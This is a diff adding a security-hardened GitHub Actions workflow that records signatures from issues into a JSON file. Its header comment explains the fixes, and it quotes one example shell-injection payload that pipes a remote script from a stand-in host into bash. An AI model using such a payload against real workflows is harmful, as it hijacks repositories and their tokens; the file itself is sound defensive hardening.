@@ -1,0 +1,141 @@
+# Add Signature — secure rewrite
+#
+# What changed from the original and why:
+#
+# 1. SHELL INJECTION FIXED. The old workflow interpolated
+#    ${{ github.event.issue.body }} directly into a `run:` script. Anyone
+#    could open an issue with a body like `"; curl evil.sh | bash; "` and
+#    execute arbitrary commands with the repo's PAT. Untrusted input now
+#    enters the script only through environment variables, which the shell
+#    treats as data, never as code.
+#
+# 2. NO MORE PERSONAL ACCESS TOKEN. The built-in GITHUB_TOKEN with a
+#    minimal, explicit permissions block replaces secrets.GH_PAT. A leaked
+#    PAT can touch every repo you own; GITHUB_TOKEN dies with the job.
+#
+# 3. INPUT VALIDATION. Name is length-limited and stripped of control
+#    characters; date must be YYYY-MM-DD; type must be from the allowlist.
+#
+# 4. DEDUPLICATION. The same name can't be appended twice.
+#
+# 5. CLOSES THE LOOP. New members get a welcome comment, the issue is
+#    closed automatically, and the commit links back to the issue.
+
+name: Add signature to the public roll
+
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  contents: write
+  issues: write
+
+concurrency:
+  group: signatures
+  cancel-in-progress: false
+
+jobs:
+  add-signature:
+    if: contains(github.event.issue.labels.*.name, 'signature')
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Parse, validate, and append signature
+        id: sign
+        env:
+          # Untrusted input is passed as environment variables ONLY.
+          # Never interpolate these with ${{ }} inside run blocks.
+          ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_AUTHOR: ${{ github.event.issue.user.login }}
+        run: |
+          set -euo pipefail
+
+          printf '%s\n' "$ISSUE_BODY" > issue.txt
+
+          # Extract the value following a "### Heading" line, skipping blanks
+          get_val() {
+            awk -v h="### $1" '
+              $0 == h { found=1; next }
+              found && NF { print; exit }
+            ' issue.txt
+          }
+
+          RAW_NAME=$(get_val "Name or Organization")
+          RAW_TYPE=$(get_val "Representation")
+          RAW_DATE=$(get_val "Date")
+
+          # --- Validate name: strip control chars, trim, cap at 80 chars ---
+          NAME=$(printf '%s' "$RAW_NAME" | tr -d '[:cntrl:]' | sed 's/^ *//;s/ *$//' | cut -c1-80)
+          if [ -z "$NAME" ] || [ "$NAME" = "_No response_" ]; then
+            echo "::error::Name is missing or empty."
+            exit 1
+          fi
+
+          # --- Validate type against allowlist ---
+          case "$RAW_TYPE" in
+            Individual|Organization) TYPE="$RAW_TYPE" ;;
+            *) echo "::error::Representation must be Individual or Organization."; exit 1 ;;
+          esac
+
+          # --- Validate date: strict YYYY-MM-DD ---
+          if ! printf '%s' "$RAW_DATE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
+            echo "::error::Date must be in YYYY-MM-DD format (got: $RAW_DATE)."
+            exit 1
+          fi
+          DATE="$RAW_DATE"
+
+          mkdir -p signatures
+          [ -f signatures/signatures.json ] || echo "[]" > signatures/signatures.json
+
+          # --- Deduplicate (case-insensitive on name) ---
+          if jq -e --arg name "$NAME" \
+               'map(.name | ascii_downcase) | index($name | ascii_downcase)' \
+               signatures/signatures.json > /dev/null; then
+            echo "duplicate=true" >> "$GITHUB_OUTPUT"
+            echo "name=$NAME" >> "$GITHUB_OUTPUT"
+            echo "::notice::'$NAME' is already on the roll. Nothing to do."
+            exit 0
+          fi
+
+          # --- Append, recording the GitHub handle for provenance ---
+          jq --arg name "$NAME" --arg type "$TYPE" --arg date "$DATE" \
+             --arg via "github:$ISSUE_AUTHOR" \
+             '. += [{name: $name, type: $type, date: $date, via: $via}]' \
+             signatures/signatures.json > tmp.json
+          mv tmp.json signatures/signatures.json
+
+          echo "duplicate=false" >> "$GITHUB_OUTPUT"
+          echo "name=$NAME" >> "$GITHUB_OUTPUT"
+
+      - name: Commit and push
+        if: steps.sign.outputs.duplicate == 'false'
+        env:
+          SIGNER: ${{ steps.sign.outputs.name }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          git config user.name "grc-garden-bot"
+          git config user.email "actions@github.com"
+          git add signatures/signatures.json
+          git commit -m "Plant a new signature (closes #${ISSUE_NUMBER})"
+          git push
+
+      - name: Welcome the new member and close the issue
+        if: always() && steps.sign.outcome == 'success'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          DUPLICATE: ${{ steps.sign.outputs.duplicate }}
+        run: |
+          set -euo pipefail
+          if [ "$DUPLICATE" = "true" ]; then
+            BODY="You're already on the roll — welcome back to the garden. 🌱"
+          else
+            BODY=$'🌱 **Your plot is planted.** Welcome to Grass Roots Cyber.\n\nYour signature is now on the [public roll](../blob/main/signatures/signatures.json) and your plot appears in [the garden](https://zmef.github.io/GrassRootsCyber/#garden).\n\nNext step: show up. Whoever shows up is the right person.'
+          fi
+          gh issue comment "$ISSUE_NUMBER" --repo "$GITHUB_REPOSITORY" --body "$BODY"
+          gh issue close "$ISSUE_NUMBER" --repo "$GITHUB_REPOSITORY" --reason completed
